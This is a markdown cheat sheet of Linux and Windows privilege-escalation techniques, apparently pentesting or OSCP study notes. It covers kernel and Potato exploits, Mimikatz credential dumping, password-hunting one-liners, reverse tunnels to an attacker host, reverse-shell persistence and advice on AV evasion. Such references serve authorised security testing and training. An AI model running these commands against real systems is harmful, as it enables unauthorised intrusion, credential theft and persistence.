# 🛡️ Privilege Escalation (Privesc)

**Tags:** `#PrivilegeEscalation` `#Privesc` `#Linux` `#Windows`

---

## 📚 General Resources

* [HackTricks](https://book.hacktricks.xyz)
* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
* [GTFOBins](https://gtfobins.github.io/)
* [LOLBAS](https://lolbas-project.github.io/)
* [LinPEAS/WinPEAS](https://github.com/carlospolop/PEASS-ng)
* [Hacking Articles - Privesc](https://www.hackingarticles.in/)
* [Red Team Notes](https://github.com/0x6f736f646f/Red-Team-Notes)
* [SpectorOps Blog](https://posts.specterops.io/)
* [OWASP Cheat Sheets](https://cheatsheetseries.owasp.org/)
* [NetSec Focus OSCP Cheatsheet](https://github.com/NetSecFocus/oscp-cheatsheet)

---

# 🐧 Linux Privilege Escalation

## 🔧 Enumeration Tools

* [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

  ```bash
  wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
  chmod +x linpeas.sh && ./linpeas.sh
  ```

* [LinEnum](https://github.com/rebootuser/LinEnum)

  ```bash
  wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
  chmod +x LinEnum.sh && ./LinEnum.sh
  ```

* [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)

  ```bash
  python linuxprivchecker.py
  ```

* [pspy](https://github.com/DominicBreuker/pspy)

  ```bash
  ./pspy64
  ```

* [chkrootkit](https://www.chkrootkit.org/)

  ```bash
  chkrootkit
  ```

---

## 💥 Exploit Tools

* [dirtycow exploit](https://github.com/firefart/dirtycow)

  ```bash
  gcc -pthread dirty.c -o dirty -lcrypt
  ./dirty
  ```

* [dirtypipe](https://github.com/hackerhouse-opensource/exploits/tree/master/CVE-2022-0847)

  ```bash
  gcc -o pipe pipe.c
  ./pipe
  ```

* [overlayfs exploit](https://github.com/sakshamsharma/overlayfs-privilege-escalation)

  ```bash
  gcc exploit.c -o exploit
  ./exploit
  ```

---

## 🔍 Common Vectors

* **Kernel Exploits** – Dirty COW, Dirty Pipe, OverlayFS
* **SUID Binaries** – Use [GTFOBins](https://gtfobins.github.io/)
* **Scheduled Tasks** – Writable cron jobs/scripts
* **Insecure File Permissions** – Writable system files
* **Exposed Credentials** – `.bash_history`, `.env`, config files
* **SSH Key Abuse** – Authorized keys / private key leaks
* **Misconfigured Services** – Systemd/init, scripts run by root

---

## 🧪 Privesc Examples

* Exploit `sudo` misconfigs (e.g. `sudo less`)
* Replace script in writable cron job
* Exploit `cap_setuid+ep` binary
* Use stolen SSH key with `ssh -i`
* Run kernel exploit for root shell

---

## 🧷 Post-Exploitation Persistence

* Add user to `/etc/sudoers`
* Add key to `/root/.ssh/authorized_keys`
* Modify `/etc/rc.local`
* Drop SUID reverse shell in `/tmp`
* Cron job running reverse shell

---

## 🧰 Post-Exploitation Tools

* [Chisel](https://github.com/jpillora/chisel) – Reverse proxy tunneling

  ```bash
  ./chisel server -p 8000 --reverse
  ./chisel client <attacker>:8000 R:8080:127.0.0.1:22
  ```

* [SSH Tunneling]

  ```bash
  ssh -L 8888:127.0.0.1:80 user@target
  ```

* [LinSnitch](https://github.com/paradoxxs/linsnitch) – Monitor post-exploit activity

* [PlistChecker](https://github.com/theevilbit/plistcheck) – Post-exploit persistence audit

---

## 🧠 Tips & Mindset

* **Automate first, verify manually**
* **Cross-reference** misconfigs
* Privilege escalation is often about **abuse, not bugs**

---

## 📜 Cheatsheet / One-Liners

```bash
find / -perm -u=s -type f 2>/dev/null
sudo -l
env | grep -i pass
grep -Ri password /etc/* 2>/dev/null
```

---

## 📋 Linux Privilege Escalation Checklist

- [ ] ✅ Run LinPEAS, LinEnum
- [ ] 🔍 Check user and group IDs
- [ ] 🔎 Sudo rights
- [ ] 🛠️ SUID/SGID binaries
- [ ] 📁 Writable root files/dirs
- [ ] 🕰️ Cron jobs/scripts
- [ ] 🔐 Configs, creds in plain text
- [ ] 🔁 Reused passwords
- [ ] 🔑 SSH key vulnerabilities
- [ ] 🧬 Kernel exploits
- [ ] ⚙️ Misconfigured services
- [ ] 🪝 Persistence paths

---

# 🪟 Windows Privilege Escalation

## 🔧 Enumeration Tools

* [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

  ```cmd
  winPEASx64.exe > output.txt
  ```

* [Seatbelt](https://github.com/GhostPack/Seatbelt)

  ```powershell
  .\Seatbelt.exe -group=all
  ```

* [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)

  ```powershell
  Import-Module .\PowerUp.ps1
  Invoke-AllChecks
  ```

* [JAWS](https://github.com/411Hall/JAWS)

  ```powershell
  .\jaws-enum.ps1
  ```

* [AccessChk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk)

  ```cmd
  accesschk.exe -uwcqv "Users" *
  ```

---

## 💥 Exploit Tools

* [JuicyPotato](https://github.com/ohpe/juicy-potato)

  ```cmd
  JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t *
  ```

* [RoguePotato](https://github.com/antonioCoco/RoguePotato)

  ```cmd
  RoguePotato.exe -r <attacker_ip> -e C:\nc.exe -lport 4444
  ```

* [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

  ```cmd
  PrintSpoofer.exe -i -c cmd.exe
  ```

---

### 🥔 Potato Exploits (Token Impersonation)

* **JuicyPotato** – Exploits COM object impersonation.

  * Requires: `SeImpersonatePrivilege`
  * Targets: Win 7/8.1, Server 2008-2016

* **RoguePotato** – NTLM relay abuse on newer Windows versions

  * Requires: NT AUTHORITY context

* **PrintSpoofer** – Lightweight SYSTEM escalation via print spooler

  * Works on: Win 10, Server 2019+

```powershell
whoami /priv
```

Look for: `SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege`

---

## 🔍 Common Vectors

* **Misconfigs** – AlwaysInstallElevated, service perms
* **Credential Exposure** – SAM, LSASS, config files
* **DLL Hijacking** – Writable directory injection
* **Scheduled Tasks** – SYSTEM task runs your script
* **UAC Bypass** – fodhelper, eventvwr

---

## 🧪 Privesc Examples

* AlwaysInstallElevated ➝ install `.msi` as SYSTEM
* Writable service ➝ replace binary
* Schedule task ➝ insert payload
* Dump LSASS ➝ extract creds
* PrintSpoofer ➝ SYSTEM shell

---

## 🧷 Post-Exploitation Persistence

* Add user to `Administrators`
* Registry `Run` key payload
* Create SYSTEM-level service
* WMI permanent event
* Script in `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\`

---

## 🧰 Post-Exploitation Tools

* [Chisel](https://github.com/jpillora/chisel) – Reverse tunnels

* [Mimikatz](https://github.com/gentilkiwi/mimikatz) – Dump creds, tokens

  ```powershell
  sekurlsa::logonpasswords
  ```

* [Nishang](https://github.com/samratashok/nishang) – PowerShell backdoors

* [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) – Remote access

  ```bash
  evil-winrm -i <target> -u <user> -p <pass>
  ```

---

## 🧠 Tips & Mindset

* Always inspect token privileges (`whoami /priv`)
* Favor stealthy paths to SYSTEM
* Avoid AV triggers – obfuscate or encode scripts

---

## 📜 Cheatsheet / One-Liners

```powershell
whoami /priv
schtasks /query /fo LIST /v
reg query HKLM /f AutoAdminLogon /t REG_SZ /s
findstr /si password *.xml *.ini *.txt
accesschk.exe -uwcqv "Users" *
```

---

## 📋 Windows Privilege Escalation Checklist

- [ ] ✅ Run WinPEAS, Seatbelt
- [ ] 🔍 `whoami /priv` for token rights
- [ ] 🛠️ AlwaysInstallElevated + `.msi`
- [ ] 📁 Writable/unquoted services
- [ ] 🔎 Scheduled tasks (SYSTEM perms)
- [ ] 🔐 Dump LSASS or grab SAM
- [ ] 🔁 Credential reuse (saved creds)
- [ ] 🧩 DLL Hijacking + PATH abuse
- [ ] 🔄 UAC bypass methods
- [ ] 🍠 Potato-based SYSTEM exploits
- [ ] 🪝 Persistence via reg/WMI/Startup

---

